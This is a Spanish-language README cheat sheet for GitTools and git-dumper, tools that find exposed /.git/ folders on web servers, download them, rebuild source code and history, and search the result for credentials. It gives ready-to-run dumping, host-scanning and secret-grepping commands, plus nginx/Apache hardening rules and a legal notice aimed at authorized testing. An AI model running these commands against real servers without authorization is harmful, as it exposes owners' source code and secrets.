<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📂 GitTools - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
   ██████╗ ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔════╝ ██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██║  ███╗██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██║   ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ╚██████╔╝██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═════╝ ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
      Exposed /.git/ Repository Dumping, Extraction & Secret Hunting
```
<p align="centro">
  <img src="https://img.shields.io/badge/GitTools-Git_Dumping-blue?style=for-the-badge" alt="GitTools">
  <img src="https://img.shields.io/badge/Author-Internetwache-orange?style=for-the-badge" alt="internetwache">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_Secrets-green?style=for-the-badge" alt="Seguridad web">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p align="centro">
  <b>📂 Kit de herramientas esencial para descubrir carpetas <code>/.git/</code> expuestas en servidores web, descargar almacenes de objetos Git sin procesar y reconstruir completamente el código fuente original y el historial de confirmaciones</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y peligro .git expuesto] (#-descripción general--el-peligro-git-expuesto)
- [Instalación](#-instalación)
- [Los tres módulos de GitTools](#-los-tres-módulos-de-gittools)
  - [1. Dumper (`gitdumper.sh`)](#1-dumper-gitdumpersh)
  - [2. Extractor (`extractor.sh`)](#2-extractor-extractorsh)
  - [3. Buscador (`finder.py`)](#3-finder-finderpy)
- [Dumper alternativo de Python: `git-dumper`] (#-alternative-python-dumper-git-dumper)
- [Secreto posterior a la reconstrucción y búsqueda de credenciales](#-secreto-posterior a la reconstrucción--búsqueda-de-credenciales)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y endurecimiento del servidor web](#-consideraciones-defensivas--endurecimiento-del-servidor-web)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y el peligro expuesto de .git

Cuando los desarrolladores implementan aplicaciones web a través de `git clone` o scripts automatizados sin restringir adecuadamente el acceso a directorios ocultos, se puede acceder a la carpeta **`/.git/`** a través de HTTP/HTTPS:
`https://target.com/.git/`

Incluso si el listado de directorios (indexación) está deshabilitado, la estructura determinista de Git permite a un atacante descargar `/.git/HEAD`, `/.git/config`, `/.git/index` y atravesar todos los objetos sueltos de Git (`.git/objects/xx/xxxx...`). Esto permite la reconstrucción completa de:
- Código fuente completo de la aplicación y API internas.
- Credenciales de base de datos, tokens API y claves SSH privadas en archivos de configuración.
- Registros completos de confirmación de git, correos electrónicos de autores y ramas de desarrollo.

---

## 📥 Instalación
```bash
# Clone GitTools repository
git clone https://github.com/internetwache/GitTools.git
cd GitTools
chmod +x Dumper/gitdumper.sh Extractor/extractor.sh

# Install alternative standalone Python git-dumper via pip
pip install git-dumper
```
---

## 🚀 Los tres módulos de GitTools

GitTools está organizado en tres utilidades especializadas:

### 1. Volquete (`gitdumper.sh`)
Descarga la mayor cantidad posible del directorio `.git` desde el servidor web:
```bash
# Syntax: ./gitdumper.sh <URL_TO_GIT> <LOCAL_DESTINATION>
./Dumper/gitdumper.sh https://target.com/.git/ /tmp/target_repo/
```
### 2. Extractor (`extractor.sh`)
Reconstruye archivos originales, árboles de confirmación y ramas de los objetos sueltos `.git` volcados:
```bash
# Syntax: ./extractor.sh <DUMPED_DIR> <OUTPUT_CODE_DIR>
./Extractor/extractor.sh /tmp/target_repo/ /tmp/extracted_source/
```
Dentro de `/tmp/extracted_source/`, cada confirmación se restaura en un directorio aislado que contiene el árbol de archivos completo en ese momento.

### 3. Buscador (`finder.py`)
Analiza listas de dominios o bloques CIDR para detectar directorios `.git` expuestos:
```bash
python3 Finder/finder.py -i targets.txt -u "Mozilla/5.0"
```
---

## 🐍 Dumper Python alternativo: `git-dumper`

`git-dumper` es una alternativa de Python multiproceso que reconstruye automáticamente un repositorio git activo y funcional en un solo paso:
```bash
# Dump and reconstruct working repository in one command
git-dumper https://target.com/.git/ ./recovered_repo/

# Run through HTTP/SOCKS proxy
git-dumper --proxy http://127.0.0.1:8080 https://target.com/.git/ ./recovered_repo/
```
Una vez completado, puede usar los comandos `git` normales dentro de la carpeta:
```bash
cd ./recovered_repo/
git log -p              # Review all commit diffs and historical edits
git status              # Check untracked files
git branch -a           # List all remote and local branches
```
---

## 🔍 Búsqueda de credenciales y secretos posteriores a la reconstrucción

Una vez recuperado el repositorio, busque credenciales y archivos ocultos:
```bash
cd ./recovered_repo/

# Search for database strings and API keys
grep -Erio "password|secret|api_key|token|AWS" .

# Scan the reconstructed repo with Gitleaks / TruffleHog
gitleaks detect -v
trufflehog git file://$(pwd)
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Volcado con git-dumper (Python)**| `git-dumper https://target.com/.git/ ./repo/` |
| **Volcado con GitTools Bash** | `./Dumper/gitdumper.sh https://target.com/.git/ ./dump/` |
| **Extraer compromisos con la fuente** | `./Extractor/extractor.sh ./dump/ ./source/` |
| **Escanear la lista de hosts en busca de .git** | `python3 Finder/finder.py -i domains.txt` |
| **Ver historial de confirmaciones** | `git log -p --color` |
| **Busca secretos codificados** | `gitleaks detect -v` |

---

## 🛡️ Consideraciones defensivas y refuerzo del servidor web

1. **Endurecimiento de Nginx:**
   ```nginx
   location ~ /\.git {
       deny all;
       return 404;
   }
   ```
2. **Endurecimiento de Apache (`.htaccess`):**
   ```apache
   RedirectMatch 404 /\.git
   ```
3. **Prácticas recomendadas de CI/CD:** Nunca implemente código clonando git directamente en la raíz web (`/var/www/html/`). Utilice paquetes de artefactos limpios o contenedores Docker.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> GitTools y git-dumper están diseñados para evaluaciones de vulnerabilidad autorizadas y auditorías de infraestructura defensiva. Descargar código fuente propietario de aplicaciones web no autorizadas sin permiso es ilegal.